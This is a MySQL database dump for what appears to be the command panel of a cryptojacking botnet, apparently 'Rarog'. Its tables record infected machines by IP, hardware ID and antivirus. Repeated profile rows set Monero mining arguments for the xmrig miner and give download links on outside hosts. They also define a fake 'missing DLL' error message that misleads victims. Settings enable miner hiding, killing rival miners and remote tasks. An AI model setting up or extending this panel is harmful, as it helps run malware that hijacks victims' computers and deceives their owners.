SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

CREATE TABLE IF NOT EXISTS `bots` (
`id` int(11) NOT NULL,
  `build` text NOT NULL,
  `hwid` text NOT NULL,
  `profile` int(11) NOT NULL,
  `os` text NOT NULL,
  `platform` text NOT NULL,
  `ip` text NOT NULL,
  `country` text NOT NULL,
  `processor` text NOT NULL,
  `videocard` text NOT NULL,
  `antivirus` text NOT NULL,
  `last_online` text NOT NULL,
  `install_date` text NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `infected_countries` (
  `Code` text NOT NULL,
  `Count` int(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `infected_countries` (`Code`, `Count`) VALUES
('AE', 0),
('AU', 0),
('BD', 0),
('BE', 0),
('BF', 0),
('BG', 0),
('BI', 0),
('BJ', 0),
('BN', 0),
('BO', 0),
('BR', 0),
('BS', 0),
('BT', 0),
('BW', 0),
('CF', 0),
('CG', 0),
('CH', 0),
('CI', 0),
('CL', 0),
('CU', 0),
('CY', 0),
('DJ', 0),
('EE', 0),
('ER', 0),
('FK', 0),
('GF', 0),
('GH', 0),
('GN', 0),
('GQ', 0),
('GW', 0),
('GY', 0),
('HN', 0),
('HR', 0),
('HT', 0),
('HU', 0),
('ID', 0),
('IE', 0),
('IL', 0),
('KE', 0),
('KG', 0),
('KH', 0),
('LB', 0),
('LK', 0),
('LR', 0),
('LS', 0),
('LV', 0),
('MG', 0),
('MM', 0),
('MN', 0),
('MR', 0),
('MW', 0),
('MX', 0),
('NA', 0),
('NC', 0),
('NE', 0),
('NL', 0),
('NZ', 0),
('OM', 0),
('PA', 0),
('PE', 0),
('PG', 0),
('PH', 0),
('QA', 0),
('RO', 0),
('RS', 0),
('SI', 0),
('SJ', 0),
('SK', 0),
('SL', 0),
('SN', 0),
('SO', 0),
('SR', 0),
('SS', 0),
('SV', 0),
('SY', 0),
('SZ', 0),
('TG', 0),
('TH', 0),
('TJ', 0),
('TL', 0),
('TW', 0),
('VE', 0),
('VN', 0),
('VU', 0),
('YE', 0),
('ZA', 0),
('PT', 0),
('PY', 0),
('ES', 0),
('ET', 0),
('IT', 0),
('JM', 0),
('AL', 0),
('AM', 0),
('MK', 0),
('ML', 0),
('GR', 0),
('GT', 0),
('TR', 0),
('TT', 0),
('TM', 0),
('TN', 0),
('KR', 0),
('XK', 0),
('KP', 0),
('KW', 0),
('CN', 0),
('CO', 0),
('PL', 0),
('PS', 0),
('CZ', 0),
('DE', 0),
('FR', 0),
('GA', 0),
('MA', 0),
('MD', 0),
('DZ', 0),
('EC', 0),
('LY', 0),
('ME', 0),
('TD', 0),
('TF', 0),
('SD', 0),
('EH', 0),
('SA', 0),
('SB', 0),
('IQ', 0),
('JO', 0),
('IR', 0),
('IS', 0),
('AZ', 0),
('BA', 0),
('UA', 0),
('UG', 0),
('BY', 0),
('BZ', 0),
('LT', 0),
('LU', 0),
('DK', 0),
('DO', 0),
('GB', 0),
('GE', 0),
('MY', 0),
('MZ', 0),
('TZ', 0),
('ZW', 0),
('CD', 0),
('AR', 0),
('NG', 0),
('NI', 0),
('CM', 0),
('CR', 0),
('US', 0),
('UY', 0),
('KZ', 0),
('LA', 0),
('UZ', 0),
('ZM', 0),
('AF', 0),
('AT', 0),
('PK', 0),
('PR', 0),
('IN', 0),
('JP', 0),
('CA', 0),
('GM', 0),
('GL', 0),
('AO', 0),
('NO', 0),
('NP', 0),
('RU', 0),
('RW', 0),
('FI', 0),
('FJ', 0),
('SE', 0),
('EG', 0);

CREATE TABLE IF NOT EXISTS `profiles` (
`id` int(11) NOT NULL,
  `name` text NOT NULL,
  `cpu_config` text NOT NULL,
  `gpu_amd_config` text NOT NULL,
  `gpu_nvidia_config` text NOT NULL,
  `delay` text NOT NULL,
  `cpu_status` text NOT NULL,
  `gpu_status` text NOT NULL,
  `cpu_32_link` text NOT NULL,
  `gpu_amd_name` text NOT NULL,
  `gpu_amd_list` text NOT NULL,
  `gpu_nvidia_name` text NOT NULL,
  `gpu_nvidia_list` text NOT NULL,
  `installs` int(11) NOT NULL,
  `error` int(1) NOT NULL,
  `error_icon` int(1) NOT NULL,
  `window_name` text NOT NULL,
  `window_text` text NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=11 ;

INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(1, '1 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(2, '2 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(3, '3 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(4, '4 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(5, '5 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(6, '6 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(7, '7 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(8, '8 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(9, '9 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');
INSERT INTO `profiles` (`id`, `name`, `cpu_config`, `gpu_amd_config`, `gpu_nvidia_config`, `delay`, `cpu_status`, `gpu_status`, `cpu_32_link`, `gpu_amd_name`, `gpu_amd_list`, `gpu_nvidia_name`, `gpu_nvidia_list`, `installs`, `error`, `error_icon`, `window_name`, `window_text`) VALUES
(10, '10 Profile', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k --max-cpu-usage=50', '-o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '--cuda-max-threads 4 -o xmr.pool.minergate.com:45700 -u yourmail@gmail.com -p x -k', '6000', '1', '1', 'http://fake-bot.ru/xmrig.exe', 'xmrig.exe', 'http://fake-bot.ru/xmrig.exe;xmrig.exe;', 'xmrig-nvidia.exe', 'http://rarog.com/files/xmrig-nvidia.exe;xmrig-nvidia.exe;', 4, 1, 1, '{EXE_NAME} - System Error', 'The program can''t start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.');


CREATE TABLE IF NOT EXISTS `settings` (
  `Name` text NOT NULL,
  `Value` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `settings` (`Name`, `Value`) VALUES
('rarog_status', '2'),
('rarog_link', 'http://yourdoamin.com/Rarog.exe'),
('minergate', '1'),
('minergate_coin', 'xmr'),
('blacklist', 'dota2.exe;csgo.exe;'),
('mining_status', '1'),
('miners_killer', '2'),
('gpu_mining', '1'),
('hide_miners', '1'),
('banned_countries', 'none;');

CREATE TABLE IF NOT EXISTS `stats` (
  `Param` text NOT NULL,
  `Value` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `stats` (`Param`, `Value`) VALUES
('all_requests', '0'),
('error_installs', '0'),
('installs', '0');

CREATE TABLE IF NOT EXISTS `tasks` (
`id` int(11) NOT NULL,
  `name` text NOT NULL,
  `task` text NOT NULL,
  `country` text NOT NULL,
  `bots` text NOT NULL,
  `count` int(11) NOT NULL,
  `success` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `tasks_log` (
  `task_id` int(11) NOT NULL,
  `bots` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `users` (
`id` int(11) NOT NULL,
  `login` text NOT NULL,
  `password` text NOT NULL,
  `profile` int(11) NOT NULL,
  `access_type` int(11) NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

INSERT INTO `users` (`id`, `login`, `password`, `profile`, `access_type`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', 0, 2);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `bots`
--
ALTER TABLE `bots`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `profiles`
--
ALTER TABLE `profiles`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tasks`
--
ALTER TABLE `tasks`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
 ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `bots`
--
ALTER TABLE `bots`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;
--
-- AUTO_INCREMENT for table `profiles`
--
ALTER TABLE `profiles`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=11;
--
-- AUTO_INCREMENT for table `tasks`
--
ALTER TABLE `tasks`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
